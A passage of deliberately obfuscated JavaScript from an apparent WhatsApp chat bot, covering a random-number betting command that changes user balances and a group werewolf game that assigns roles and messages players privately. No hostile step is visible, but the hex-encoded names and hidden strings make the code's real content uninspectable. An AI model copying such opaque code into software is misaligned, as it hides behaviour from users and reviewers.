reply(_0x480ff3(-0x30e,-0x95,-0xde,-0x153,-0x129)+_0x2fe230(0xa,0xcb,-0x133,0x1bc,0x17c)+_0x9b1ba0(-0x113,-0x149,0x56,-0x12f,-0x137)+_0x2fe230(-0xd5,-0x19c,-0x256,-0x339,-0xdb)+_0x9b1ba0(-0x8a,-0x4d,-0x97,-0x27e,-0x147)+_0x9b1ba0(0xbe,0x23c,0xad,0x1f7,0x1f6)+_0x28040b(0x1b4,0x280,0xf6,0x380,0x1b8)+_0x526c7c(0x111,0x114,0x149,0x4f,0x61)+_0x480ff3(0x1e5,-0xf1,0xc,0x3,-0x18a)+_0x480ff3(0x82,0x130,0x8f,-0x71,-0xbf)+_0x9b1ba0(-0x243,-0x1ee,-0x156,-0x368,-0x40a)+_0x526c7c(0x256,0x2fe,0x1ec,0x339,0x476)+_0x480ff3(-0x34d,-0x14e,-0x11d,-0x237,-0x247)+_0x2fe230(0x18e,0x1fb,0x16a,0x87,0x1aa)+_0x480ff3(0x43,0xf2,-0x127,0xcf,-0x54)+_0x9b1ba0(-0x19a,-0x37b,-0x305,0x32,-0xe5)+_0x526c7c(0x235,0x200,0x63,0x276,0x1ea)+'\x20$'+anu);var tambah=Number(q)+Number(q),angka1=await randomNomor(-0x50e+-0x218+-0x1*-0x72e),angka2=await randomNomor(-0x142b+0x1861+-0x59*0xc);if(angka1>angka2)addBalance(sender,nebal(tambah),balance),reply(_0x9b1ba0(-0xa4,-0x1a8,-0x1d7,-0xe5,-0xd7)+_0x480ff3(-0x1fb,-0x25a,-0xd5,-0x27d,-0xa6)+_0x480ff3(0x47,0x6a,0xc2,-0xdc,-0x150)+_0x480ff3(0x2a,-0xb0,-0x286,-0x132,-0x10c)+_0x480ff3(-0x33,-0x27,-0xde,0xa,-0xe)+q+(_0x526c7c(0x389,0x349,0x3c0,0x3f2,0x329)+_0x2fe230(-0x1ff,-0x31,-0x186,-0x19,0x5d)+_0x9b1ba0(-0x101,-0x133,-0x17,-0xbd,-0x154)+_0x28040b(0x152,0x34c,0x250,0x1e3,0x207)+_0x28040b(-0xe0,0xbc,-0x2b9,0x9b,0xab)+_0x526c7c(0x121,0x2af,0x2cd,0x490,0x1b2)+_0x480ff3(-0x229,-0x2a8,-0xb7,-0x193,-0x11)+_0x526c7c(0x2cd,0x46f,0x30c,0x28c,0x3ec))+tambah+(_0x526c7c(0x47e,0x349,0x4e7,0x3cc,0x2d9)+_0x2fe230(0x28b,0x186,0x15d,0x233,-0xc)+_0x2fe230(-0x12c,0x80,-0x9d,0xb0,0x18e))),gameAdd(sender,glimit);else angka1<angka2&&(kurangBalance(sender,nebal(q),balance),reply(_0x28040b(-0x43,-0x1aa,-0x21d,-0xf6,-0xde)+_0x2fe230(-0x193,-0x159,-0x2,-0x1da,-0x13e)+_0x480ff3(-0xd2,-0x2b5,-0x1db,-0xdc,-0xd)+_0x526c7c(0x184,0x290,0x30d,0x1bd,0x299)+_0x9b1ba0(0x81,-0xf,0x1f8,0x24,0x88)+q+(_0x2fe230(0x11c,0xab,0x2a8,0x19e,0x218)+_0x9b1ba0(-0xde,-0x1d1,-0x70,-0x2d3,-0x9)+_0x9b1ba0(0x39,0x96,0x67,0x86,-0x6)+_0x526c7c(0x16d,0x157,-0xe,0x1b5,0x1ee)+_0x28040b(0xd7,0x108,-0x57,0x38,-0x3)+_0x2fe230(0x6e,-0xf7,-0x2bb,0xdf,0x9f)+_0x526c7c(0x27,0x11c,0x107,0x2c6,-0x19)+_0x480ff3(0xee,-0x147,0x92,0x6b,0xee))+q+(_0x28040b(0x5f,0x17f,0x8f,-0x16e,0x10b)+_0x2fe230(0x19a,0x186,-0x64,0x367,0x2e3)+_0x28040b(0x119,-0x34,0x1e6,-0x98,-0xda))),gameAdd(sender,glimit));break;case prefix+'ww':case prefix+(_0x28040b(0x17b,0x49,0x10b,-0x2a,0x1e2)+_0x28040b(0x1fc,0x109,0x259,0x180,0x58)):{if(!isGroup)return reply(mess[_0x9b1ba0(0x116,0x2cc,-0xeb,0x296,0xbc)+_0x480ff3(0x48,0x6e,0x5c,0x69,0xec)]);conn[_0x480ff3(-0x88,-0x78,0x10d,0xa3,0x1f4)+_0x480ff3(0x1d8,0x2bf,0x56,0x124,-0x1c)]=conn[_0x2fe230(0x2a4,0x1c7,0x159,0x2b4,0x36b)+_0x2fe230(0x68,0x248,0x2cc,0x3cd,0x124)]?conn[_0x9b1ba0(0x11a,-0x34,0xe2,0x21f,0x12d)+_0x2fe230(0x38d,0x248,0xdb,0x3cb,0x3fa)]:{};let ww=conn[_0x28040b(0x17b,0x284,0x22,0xaf,0x22e)+_0x28040b(0x1fc,0x221,0x333,0x200,0x366)],data=ww[from],value=args[0x10dc+0x13*-0x47+0xb96*-0x1],target=args[0x1*-0x1826+0x214+0x3*0x75c];if(value===_0x9b1ba0(-0x16,-0xd7,0x94,-0x62,0x1dc)+'e'){if(from in ww)return reply(_0x526c7c(0x6b,0x138,0x16,0x24e,0x2cd)+_0x480ff3(-0x271,0x8,-0x39,-0xf6,0xbf)+_0x526c7c(0x345,0x316,0x437,0x1d2,0x37c)+_0x526c7c(0x238,0x18f,0x302,-0x5c,0x2b)+_0x28040b(0xfb,0x6c,0x2e3,-0x26,-0xb4)+_0x526c7c(0x2ff,0x1bb,0xec,0x136,0x8b)+'an');if(playerOnGame(sender,ww)===!![])return reply(_0x526c7c(0x258,0x3c1,0x531,0x1fb,0x44a)+_0x2fe230(-0xb6,0xc6,0x1a7,0x4,-0x53)+_0x526c7c(0x587,0x4d5,0x305,0x57a,0x5db)+_0x2fe230(0x76,-0x80,0x4,-0x279,-0x83)+_0x480ff3(0x44,-0x28c,0x57,-0x14f,-0x2e)+'e');ww[from]={'room':from,'owner':sender,'status':![],'iswin':null,'cooldown':null,'day':0x0,'time':_0x28040b(0xe,-0x161,0xcc,-0x1cd,0xc6),'player':[],'dead':[],'voting':![],'seer':![],'guardian':[]},await reply(_0x480ff3(-0x1f0,-0x11b,-0x128,-0x243,-0x2e1)+_0x28040b(0x16a,-0x5d,0x1b2,0x221,0x10)+_0x480ff3(0x68,0x121,0xd5,0x80,0x13a)+_0x28040b(-0x132,-0x1be,-0xfc,-0x2d8,-0x215)+_0x2fe230(0x2a4,0x1c2,0x391,-0x34,0x2a3)+_0x9b1ba0(0x56,-0x11,0x18e,-0x10c,0x17e)+_0x526c7c(0x224,0x3d5,0x51e,0x560,0x4a7)+_0x526c7c(0x20c,0x128,0x299,0x2e,0xba)+_0x526c7c(0x2f5,0x120,0x31e,-0x2f,0x1f)+_0x480ff3(0x56,0xfd,0x176,0x102,0xa9)+_0x526c7c(0x4df,0x315,0x123,0x47b,0x4db));}else{if(value===_0x28040b(-0x62,-0x2d,-0x15d,0x15c,0x12e)){if(!ww[from])return reply(_0x2fe230(0x290,0x1ea,0x2b5,0x31d,0x358)+_0x526c7c(0x57,0x110,0x179,-0x14,0x245)+_0x2fe230(0xc8,0xef,0x138,0x195,0x17b)+_0x28040b(0x1e5,0x175,0x99,0x2a1,0xfc)+_0x28040b(0x90,-0x9d,-0xab,-0x11a,-0xb5));if(ww[from][_0x28040b(0x2a,-0x1a0,0xa7,-0x102,-0xdd)+'s']===!![])return reply(_0x28040b(0xbb,0x26b,0x9f,0x16,0x246)+_0x9b1ba0(0x184,0x1e2,0x315,0x167,0xbd)+_0x2fe230(-0xc9,0xb5,-0x23,0x233,-0xf0)+_0x28040b(-0x18,-0x186,0xef,0xf3,-0x167)+_0x28040b(-0x16,-0x75,-0x187,-0x19b,-0x204)+_0x28040b(-0x1dd,-0x16b,-0x86,-0x102,-0x1e0));if(ww[from][_0x9b1ba0(0xd3,0xbd,0x1a9,-0xa5,0x9a)+'r'][_0x28040b(0x7,0xc7,0x1bd,-0x62,-0x2f)+'h']>-0x1edb+0x133a+-0xbb1*-0x1)return reply(_0x480ff3(-0x388,-0x12e,-0x1ef,-0x1bb,-0x1d7)+_0x2fe230(-0x1ec,-0x96,-0xb9,0x53,-0x61)+_0x9b1ba0(-0x20c,-0x3e1,-0x3b5,-0x3a1,-0x310)+_0x526c7c(0x2f9,0x25b,0x413,0x1e2,0x3b9)+_0x2fe230(-0xde,-0x34,-0x8e,-0xb6,-0xd5)+_0x480ff3(-0x1e,-0x1c1,-0x3b2,-0x1c4,-0x32f));if(playerOnRoom(sender,from,ww)===!![])return reply(_0x2fe230(-0x2a,0x123,-0x4c,0x2bf,0x1fc)+_0x480ff3(0x2,-0x1b4,-0x17,-0xf0,-0x2a8)+_0x526c7c(0x223,0x368,0x40f,0x50d,0x3a4)+_0x28040b(0x1eb,0x349,0x19e,0x379,0x320)+_0x9b1ba0(-0x177,-0x190,-0xe1,-0x4c,-0xbf)+_0x9b1ba0(-0xae,-0x6e,-0x1e9,-0x162,0x52));if(playerOnGame(sender,ww)===!![])return reply(_0x480ff3(-0x156,-0x25,-0xcf,-0x1,0xd1)+_0x480ff3(-0xb4,-0x149,0x19a,-0x5e,-0x65)+_0x2fe230(0x9f,0x237,0x65,0x21a,0x1c9)+_0x480ff3(-0x10a,0x17,-0x264,-0x1a4,-0x59)+_0x480ff3(-0xdb,-0xd6,-0x14a,-0x14f,0xae)+'e');const _0x2cf8f5={};_0x2cf8f5['id']=sender,_0x2cf8f5[_0x2fe230(0x129,0x67,0x1d,-0x162,0x189)+'r']=ww[from][_0x9b1ba0(0xd3,0x8e,-0x10e,0x11c,0x32)+'r'][_0x28040b(0x7,-0x158,-0x2c,-0xaf,0x184)+'h']+(-0x1b91+-0x17eb+-0x10d*-0x31),_0x2cf8f5[_0x480ff3(0x116,0x1b6,-0x74,0xe7,-0x4b)]=from,_0x2cf8f5[_0x526c7c(0x367,0x314,0x247,0x1d9,0x4d8)+'s']=![],_0x2cf8f5[_0x9b1ba0(-0xd0,-0x24a,0xf4,-0x99,-0x2b3)]=![],_0x2cf8f5[_0x2fe230(0x346,0x216,0x262,0x2bb,0x84)+'t']=[],_0x2cf8f5[_0x480ff3(0xeb,0x241,0x201,0x56,0x3b)]=0x0,_0x2cf8f5[_0x9b1ba0(-0x201,-0x3fb,-0x3ee,-0x33e,-0x142)+'d']=![],_0x2cf8f5[_0x2fe230(-0x1e2,-0x5c,-0xc0,0x11f,-0x220)+'e']=![];let data=_0x2cf8f5;ww[from][_0x480ff3(0x17b,-0x135,-0x20,0x5c,-0x8e)+'r'][_0x480ff3(0xd1,-0xc,0x56,0x72,0x16e)](data);let player=[],text=_0x28040b(0x187,0x201,-0x35,0x3a,0x11f)+_0x28040b(-0x37,0x1a6,0x1,0x44,0x4)+_0x2fe230(-0x105,-0x12a,-0x31a,-0x1f6,-0xc9)+_0x2fe230(0xe0,0x19d,0xe0,0x10e,0x19e)+_0x9b1ba0(-0x1a5,-0x37a,-0x1f7,-0x7,-0x2ad);for(let i=0x163*-0xf+-0x66*-0x2b+0x3ab;i<ww[from][_0x526c7c(0x61e,0x41e,0x456,0x61e,0x21f)+'r'][_0x526c7c(0x49b,0x2f1,0x49f,0x451,0x2e6)+'h'];i++){text+='('+ww[from][_0x480ff3(-0x9b,0xb0,-0x6e,0x5c,0x23f)+'r'][i][_0x526c7c(0x327,0x305,0x32c,0x198,0x20f)+'r']+_0x9b1ba0(0x17b,0x166,0x47,0x33a,0x13f)+ww[from][_0x28040b(0x134,0xa9,0x198,0x16b,0x68)+'r'][i]['id'][_0x526c7c(0x33d,0x275,0x109,0x41d,0x373)+'ce'](_0x2fe230(0x13a,0x3c,0x1fd,0x1f8,0x1cd)+_0x9b1ba0(-0x1b4,-0x397,-0x1e3,-0x223,-0xb6)+_0x2fe230(0x19c,0x6a,0x114,-0x85,-0xd7),'')+'\x0a',player[_0x2fe230(0x22b,0x196,0x2d6,0x234,0x1f7)](ww[from][_0x526c7c(0x4b2,0x41e,0x3c2,0x539,0x619)+'r'][i]['id']);}text+=_0x526c7c(0xc4,0x154,0x2eb,0x272,-0x67)+_0x28040b(-0x1aa,-0x7e,-0x27,0x45,-0x353)+_0x480ff3(-0xa2,-0x2a2,-0xac,-0x294,-0x300)+_0x9b1ba0(0xac,0x290,0x13a,-0xc,0x24c)+_0x9b1ba0(-0x133,0x6d,0x8b,-0x1c3,-0x54)+_0x9b1ba0(0x16d,0x9e,0xb2,0x345,0x27d)+_0x9b1ba0(-0xa3,-0x20b,-0x209,0x24,-0xda)+_0x28040b(0x1a8,0x274,0x19a,-0x12,0x22c)+_0x480ff3(-0x7c,-0x12e,-0x98,-0x23e,-0x2e5)+'5',reply(text[_0x526c7c(0x338,0x259,0x2e0,0x37e,0x342)]());}else{if(value===_0x526c7c(0x55,0x1de,0x7c,-0x16,0x265)){if(!ww[from])return reply(_0x480ff3(0x29d,0xc8,-0xbb,0xc6,0x10a)+_0x480ff3(-0x471,-0x2b5,-0x430,-0x2b2,-0x3c6)+_0x2fe230(0x264,0xef,0x240,0xb4,0x204)+_0x2fe230(0x329,0x231,0x2e1,0x268,0x272)+_0x2fe230(0x21,0xdc,0x234,-0xcd,0x28a));if(ww[from][_0x2fe230(0x20a,0x180,0x25a,0x12a,0x226)+'r'][_0x2fe230(-0x17b,0x53,0x1b5,0x4d,0x103)+'h']===0x15e3+-0x10d0+-0x1b1*0x3)return reply(_0x2fe230(0x8d,-0x11f,-0x14,-0x217,-0x21)+_0x480ff3(-0x379,0x72,-0x154,-0x17b,-0x111)+_0x9b1ba0(0x151,0x183,0xa7,0x50,0xb2)+_0x2fe230(-0x5d,0xe0,-0xa7,-0x6,0xcf)+_0x526c7c(0x4b0,0x41e,0x225,0x4da,0x5dc)+'r');if(ww[from][_0x526c7c(0x39e,0x41e,0x5a3,0x5a3,0x335)+'r'][_0x9b1ba0(-0x5a,-0x1e9,-0x67,0x7b,-0x40)+'h']<0x1*0x1e4e+0x1bf4*0x1+-0x3a3d)return reply(_0x526c7c(0x2e0,0x207,0x27e,0x110,0x405)+_0x28040b(-0xe2,-0x1fa,0x26,-0x6e,-0x152)+_0x526c7c(0x2e0,0x13f,0x331,0xf2,0x7e)+_0x9b1ba0(0x45,0x6b,-0x179,-0x10f,0xc6)+_0x9b1ba0(-0x220,-0x372,-0x324,-0x1cb,-0x282)+_0x28040b(-0x11e,-0x11,-0x1b6,0x64,-0x137)+_0x2fe230(0x25a,0x1a6,0xd0,0x16d,0x359)+_0x2fe230(0x69,0xf9,0x1a8,-0x1c,0x1d0));if(playerOnRoom(sender,from,ww)===![])return reply(_0x9b1ba0(0x76,-0xdc,-0x100,0x14d,-0x46)+_0x480ff3(-0x2d3,-0x2d,-0x65,-0x17b,-0x33a)+_0x2fe230(0xec,0xca,0x20b,-0x6b,0x17a)+_0x526c7c(0x4d3,0x4d5,0x68d,0x650,0x4b8)+_0x2fe230(-0xc2,-0xca,-0xa6,-0x2a9,-0x2b4)+_0x526c7c(0x3ec,0x29d,0x403,0xfb,0x2d7));if(ww[from][_0x28040b(-0x151,0x12,-0x258,-0x25c,-0x57)+_0x9b1ba0(-0x132,0x5d,-0x207,-0xef,-0x120)]>0x293+0x2672+-0x1*0x2905){if(ww[from][_0x9b1ba0(-0x135,-0x5c,0x6e,-0x154,-0x48)]===_0x2fe230(-0x8e,-0x33,-0x1de,0x1c0,-0x12d)+'g')return clearAllVote(from,ww),addTimer(from,ww),await run_vote(conn,from,ww);else{if(ww[from][_0x28040b(-0xd4,-0x5b,-0xe3,-0x11e,-0x272)]===_0x2fe230(-0xe7,0x5a,-0xe3,-0x4d,0xe))return clearAllVote(from,ww),addTimer(from,ww),await run_malam(conn,from,ww);else{if(ww[from][_0x526c7c(0x1ed,0x216,0x3ed,0x21f,0x35e)]===_0x526c7c(0x325,0x2ce,0x123,0x38a,0x261))return clearAllVote(from,ww),addTimer(from,ww),await run_pagi(conn,from,ww);}}}if(ww[from][_0x9b1ba0(-0x37,-0x38,0xca,0x19c,0x1c0)+'s']===!![])return reply(_0x526c7c(0x454,0x3a5,0x3ca,0x529,0x3a4)+_0x9b1ba0(0x184,0x331,0x349,0x268,0x2e5)+_0x526c7c(0x23e,0x353,0x1f1,0x36a,0x41f)+_0x2fe230(0xe7,0xa8,0x31,0x7b,-0x121)+_0x28040b(-0x16,-0x1f5,0x130,0xb2,-0x38)+_0x526c7c(0x2df,0x10d,0x24,0x88,0x14b));if(ww[from][_0x480ff3(-0x6f,-0x1c1,0x185,-0x49,0x11d)]!==sender)return reply(_0x9b1ba0(-0x68,-0x72,0xcf,-0x219,-0x15f)+'\x20@'+ww[from][_0x28040b(0x8f,0x15e,0x1a6,-0x11c,0x1c7)][_0x28040b(-0xcd,0xe7,-0x50,-0x28c,-0x171)]`@`[0x15e8+0x1f5b+-0x9*0x5eb]+(_0x9b1ba0(0x4e,-0x92,0x229,-0xb4,0x229)+_0x526c7c(0x381,0x22b,0x3fc,0x148,0x292)+_0x28040b(0xcc,-0xc8,0x176,0x2ca,-0x12a)+_0x480ff3(-0x6e,-0x53,-0x28d,-0x208,-0x1e4)+_0x526c7c(0x453,0x4cf,0x63c,0x393,0x5b2)+_0x2fe230(-0x62,0xdc,-0x8e,0xef,0xca)));let list1='',list2='',player=[];roleGenerator(from,ww),addTimer(from,ww),startGame(from,ww);for(let i=0x397*-0x5+-0x14d3*0x1+0x26c6;i<ww[from][_0x480ff3(-0x25,-0x88,-0xc6,0x5c,0x244)+'r'][_0x28040b(0x7,0xd0,-0x84,0xa9,0x17a)+'h'];i++){list1+='('+ww[from][_0x28040b(0x134,0x131,0x1f5,-0xc5,-0xc6)+'r'][i][_0x480ff3(-0x75,0x22,-0x1c4,-0xbd,-0x107)+'r']+_0x28040b(0x1dc,0xe9,0x7d,-0x11,0xbf)+ww[from][_0x2fe230(-0x42,0x180,-0x78,-0x6a,0x146)+'r'][i]['id'][_0x480ff3(-0x301,0x20,-0x19d,-0x14d,0x93)+'ce'](_0x480ff3(-0x5,-0x1aa,-0x264,-0xe8,0xfe)+_0x9b1ba0(-0x1b4,0x11,-0x285,-0x1f,-0x107)+_0x9b1ba0(-0x43,-0x1de,-0x181,-0x1e2,-0x9f),'')+'\x0a',player[_0x28040b(0x14a,0x33f,0xad,0x136,0x2c8)](ww[from][_0x9b1ba0(0xd3,-0xd8,0x29b,0x1f4,0x4a)+'r'][i]['id']);}for(let i=0x1fb2+0x1*0x2267+0x1*-0x4219;i<ww[from][_0x2fe230(0x22,0x180,0x1a1,0xcf,0xdd)+'r'][_0x9b1ba0(-0x5a,-0x1f3,0x12c,-0x98,-0x13d)+'h'];i++){list2+='('+ww[from][_0x480ff3(-0x72,0x3a,-0x104,0x5c,0x1d4)+'r'][i][_0x28040b(0x1b,0xae,0x15d,0xc1,0x1f2)+'r']+_0x480ff3(-0xe9,-0x52,0x2c4,0x104,-0x50)+ww[from][_0x526c7c(0x236,0x41e,0x580,0x3d9,0x2ef)+'r'][i]['id'][_0x480ff3(-0xb6,-0x2aa,0x6,-0x14d,-0xc8)+'ce'](_0x2fe230(-0x2e,0x3c,0x18,0x114,-0xc4)+_0x28040b(-0x153,0x70,-0x26e,0x0,-0x213)+_0x9b1ba0(-0x43,-0x18d,0xcd,-0x15c,-0xc0),'')+'\x20'+(ww[from][_0x480ff3(0x111,-0xb0,-0x16e,0x5c,-0x177)+'r'][i][_0x9b1ba0(-0xd0,0x11b,0x6a,-0x2,-0xa6)]===_0x526c7c(0x29a,0x465,0x38b,0x4f3,0x533)+_0x9b1ba0(0x19b,0x21c,0x2f7,0xa,0x38f)||ww[from][_0x480ff3(0x25a,0x211,-0xb1,0x5c,-0x8)+'r'][i][_0x480ff3(-0x2bb,-0x1a,-0x74,-0x147,-0xfd)]===_0x526c7c(0x4ea,0x3fb,0x5e3,0x2af,0x229)+_0x526c7c(0x4b9,0x4bf,0x3a0,0x4fe,0x3c1)?'['+ww[from][_0x480ff3(0x106,0x15a,-0xe5,0x5c,-0x5a)+'r'][i][_0x9b1ba0(-0xd0,-0x249,0x59,-0x109,-0x14c)]+']':'')+'\x0a',player[_0x2fe230(0x4c,0x196,0x47,0x2fc,-0x49)](ww[from][_0x28040b(0x134,0x29c,0x2b3,-0x6d,0xb4)+'r'][i]['id']);}for(let i=-0x1382+-0x1*0x171e+0x2aa0;i<ww[from][_0x480ff3(0x64,-0xef,-0xa7,0x5c,0x9e)+'r'][_0x28040b(0x7,-0x31,-0x19f,0x5d,0xe8)+'h'];i++){if(ww[from][_0x480ff3(0x18f,-0x7f,0x23a,0x5c,-0x5d)+'r'][i][_0x9b1ba0(-0xd0,-0x151,0xfb,0x5b,-0x52)]===_0x526c7c(0x35e,0x465,0x30d,0x65b,0x52f)+_0x28040b(0x1fc,0x89,0x27f,0x113,0xf7)){if(ww[from][_0x526c7c(0x4ef,0x41e,0x2d8,0x56c,0x34b)+'r'][i][_0x2fe230(-0x11e,-0x154,-0x52,-0x1d0,-0x37)+'d']!=!![]){let text=_0x9b1ba0(0x196,0x127,0x215,0x18f,0x387)+conn[_0x526c7c(0x200,0x176,0x30a,0x209,0x344)+'me'](ww[from][_0x2fe230(0xfb,0x180,0x96,0x35a,0x296)+'r'][i]['id'])+(_0x480ff3(-0x19f,-0x376,-0x20d,-0x275,-0x131)+_0x9b1ba0(-0x206,-0x3c8,-0x1ac,-0x2a8,-0xa0)+_0x480ff3(-0x24f,-0x36b,-0x220,-0x17a,-0x1e7)+_0x28040b(0x45,-0x155,-0x19d,-0xb8,0x15d)+_0x526c7c(0x1e,0xff,0x216,0x1d6,-0xad)+_0x9b1ba0(0x128,0x7e,0x194,-0xd8,0x144)+_0x9b1ba0(0x5b,-0x3e,0x206,0x253,-0xff)+_0x526c7c(0x5dd,0x3ec,0x5d8,0x232,0x3a5)+_0x9b1ba0(-0x1a8,-0x32b,-0x38,-0x112,-0x105)+_0x480ff3(-0xce,-0x1eb,-0x2c0,-0x1de,-0x16c))+emoji_role(_0x9b1ba0(0x11a,0x1c7,0x1c5,0x2de,0x127)+_0x28040b(0x1fc,0xc4,0x118,0x32c,0x94))+(_0x526c7c(0x35c,0x4ba,0x480,0x3f7,0x342)+_0x9b1ba0(-0x1ef,-0x2d2,-0x35c,-0x30e,-0x1b6)+_0x480ff3(-0x159,-0x2f2,-0x2ba,-0x18f,-0x28b)+_0x9b1ba0(0x9b,-0x1f,0x168,0x168,-0x7b)+_0x526c7c(0x3bf,0x4d6,0x585,0x619,0x691)+_0x28040b(-0x3e,0x1b6,0x153,0xd6,0xff)+_0x526c7c(0x59d,0x44c,0x3c5,0x43c,0x4ac)+_0x28040b(0x45,0x199,0xc4,-0x1b4,-0x45)+_0x9b1ba0(-0x156,0x3b,0x53,-0x313,-0x25b)+_0x526c7c(0x2aa,0x440,0x35a,0x52c,0x253)+_0x28040b(0xc5,0x235,0x20e,0xe2,0x16d)+_0x2fe230(-0x191,0x4d,0x1ab,0x1c6,0x23b)+_0x2fe230(0x13e,0x1fd,0x2f6,0x115,0x3ed)+_0x480ff3(0x3f,-0x2bd,-0x265,-0x179,-0x2d9)+_0x480ff3(-0x160,-0x3e2,-0x2da,-0x250,-0x214)+_0x9b1ba0(0x104,0x186,0xdc,0x51,0x1c8)+_0x2fe230(0x415,0x21c,0x416,0x2ab,0xa9)+_0x2fe230(-0x206,-0x14f,-0x139,-0x21,0x20)+_0x9b1ba0(-0xd,-0x1fd,-0x56,-0x19b,0x15f)+_0x526c7c(0x2e3,0x20e,0x41,0x23e,0x36)+_0x480ff3(-0x59,-0x3a9,-0x23b,-0x23a,-0x10b)+_0x28040b(0x95,0x142,-0x88,0x12a,-0x2)+_0x9b1ba0(-0x21d,-0x31b,-0x284,-0x14a,-0x25)+_0x28040b(-0xb5,-0x26f,-0x66,0x130,-0x156))+list2+(_0x480ff3(-0x101,-0x83,-0xd0,-0x2e,-0x1c9)+_0x2fe230(0x14b,-0x65,-0xda,0xd1,-0x1a4)+_0x28040b(-0x8b,-0x254,-0x159,0x98,-0x157)+_0x28040b(0x3a,-0x4,-0x1b,0x19c,-0x49)+_0x28040b(0x44,0xd8,0xcb,-0x1ae,0x193)+_0x9b1ba0(-0x24c,-0x35e,-0x23c,-0x143,-0x24e)+_0x28040b(0x189,-0x11,0x1ec,0xf7,0x247)+_0x526c7c(0x49b,0x2cf,0x2d5,0x3d5,0x3b7)+_0x2fe230(0x59,-0x140,-0xf5,-0xf2,-0x288)+'er');const _0x7b9fd={};_0x7b9fd[_0x526c7c(0xfc,0x1f6,0x13f,0x327,0x1b8)]=text,_0x7b9fd[_0x526c7c(0x2f4,0x2b7,0x108,0xc6,0x267)+_0x480ff3(-0x21e,-0x188,-0x273,-0x2b8,-0x462)]=player,await conn[_0x480ff3(-0xac,0xb9,-0x2b,0x86,-0x6)+_0x526c7c(0x22d,0x229,0x20d,0x3c7,0x37e)+'e'](ww[from][_0x9b1ba0(0xd3,-0x50,0x245,0x88,-0x33)+'r'][i]['id'],_0x7b9fd);}}else{if(ww[from][_0x480ff3(-0x42,0x141,-0xbf,0x5c,-0xe3)+'r'][i][_0x480ff3(-0x1f0,-0x31a,0x34,-0x147,-0x322)]===_0x526c7c(0x4b0,0x38b,0x2d7,0x366,0x1c2)){if(ww[from][_0x526c7c(0x469,0x41e,0x5ef,0x53f,0x2b3)+'r'][i][_0x28040b(-0x1a0,-0x10c,-0x135,-0x115,0x7)+'d']!=!![]){let text=_0x28040b(0x187,0x3b,0x225,0x2a9,0xcc)+_0x480ff3(-0x228,-0xf7,0xb2,-0x10f,-0x109)+_0x480ff3(0xb1,-0x139,-0x1a4,-0x91,0x73)+_0x28040b(0x1ed,0x315,0x73,0x47,0x37e)+_0x526c7c(0x1f5,0x1c7,0x178,0x39f,0x28f)+conn[_0x9b1ba0(-0x1d5,-0x169,-0x2a5,-0x26b,-0xdd)+'me'](ww[from][_0x480ff3(0x1f7,0x4b,-0xfa,0x5c,-0x45)+'r'][i]['id'])+(_0x2fe230(-0x70,0x16f,0x19a,0x236,0x218)+_0x480ff3(-0x351,-0x27f,-0x18c,-0x1c7,-0x36f)+_0x526c7c(0x284,0x133,-0x20,0x24e,0x21a)+_0x480ff3(-0x3ae,-0x4b,-0x163,-0x1cf,-0x378)+_0x9b1ba0(-0xef,0xf1,-0x1ae,-0xc6,-0xa0)+_0x9b1ba0(-0x24a,-0x1b7,-0x29d,-0xe8,-0x3da)+'*\x20')+emoji_role(_0x480ff3(-0x1ba,0xe3,0x115,-0x37,-0x14))+(_0x480ff3(-0x6c,-0xb4,-0x247,-0x1d7,-0x3bd)+_0x2fe230(0x273,0x14d,0xc0,0x130,0x331)+_0x28040b(-0xd3,-0x2a4,0xa8,0x109,-0x33)+_0x526c7c(0xbe,0x24e,0x20a,0x11c,0x12d)+_0x480ff3(0x296,0x159,-0xcc,0x101,0x3e)+_0x9b1ba0(-0x12,-0x17b,0x3e,-0x197,0x154)+_0x526c7c(0xc7,0x244,0x11f,0x197,0x85)+_0x28040b(-0xd6,-0x3a,-0xbf,-0x2bc,-0x174)+_0x2fe230(-0xc8,-0x18d,-0x1f5,-0x112,-0x37c)+_0x480ff3(-0x32a,-0x364,-0x3d7,-0x20e,-0x211)+_0x526c7c(-0x2d,0x14f,0x268,0x2e8,0x1)+_0x2fe230(-0x9a,-0x1,-0x12b,-0xfe,-0xe7)+_0x2fe230(0xa,0x19f,0x35d,0x267,0x2)+_0x9b1ba0(0xd8,0xb3,-0x35,-0xd4,0x2d2)+_0x2fe230(0x3b,0x15f,0x278,0x30b,0xf0)+_0x28040b(-0x110,-0x78,-0x2d8,-0x20f,-0x8d)+_0x480ff3(0x1,0x196,-0x166,-0x6b,0x127)+_0x2fe230(0x107,-0xc6,0x24,-0x81,0x103)+_0x28040b(-0x1e,0x53,0x146,-0x7d,-0x79)+_0x526c7c(0x3a0,0x4c9,0x5b5,0x2e5,0x411)+_0x2fe230(0x22c,0x138,0x4a,-0x34,0x105)+_0x2fe230(0x1c2,0x180,0x2fe,0x2b6,0x322)+_0x2fe230(-0x29,0xd8,0x166,0x73,-0x104))+list1;const _0x1c23b7={};_0x1c23b7[_0x480ff3(-0xde,-0x243,-0xe3,-0x1cc,-0x23b)]=text,_0x1c23b7[_0x2fe230(0x1c1,0x19,-0x1a1,0x9c,0x195)+_0x480ff3(-0x3fc,-0x2bf,-0x298,-0x2b8,-0x475)]=player,await conn[_0x28040b(0x15e,0x212,0xa2,-0xa1,0x105)+_0x526c7c(0x101,0x229,0x2ed,0x12a,0x23d)+'e'](ww[from][_0x28040b(0x134,-0x84,0x8a,0x17c,0x13e)+'r'][i]['id'],_0x1c23b7);}}else{if(ww[from][_0x9b1ba0(0xd3,0x228,-0x11e,0x2be,0x21d)+'r'][i][_0x9b1ba0(-0xd0,0x105,-0x13f,-0x57,-0x23c)]===_0x2fe230(-0x26,0x1cc,0x33a,0x23f,0xdf)){if(ww[from][_0x480ff3(-0x4b,0x33,0x204,0x5c,-0xb5)+'r'][i][_0x9b1ba0(-0x201,-0x40,-0x3f6,-0x3bb,-0x3e8)+'d']!=!![]){let 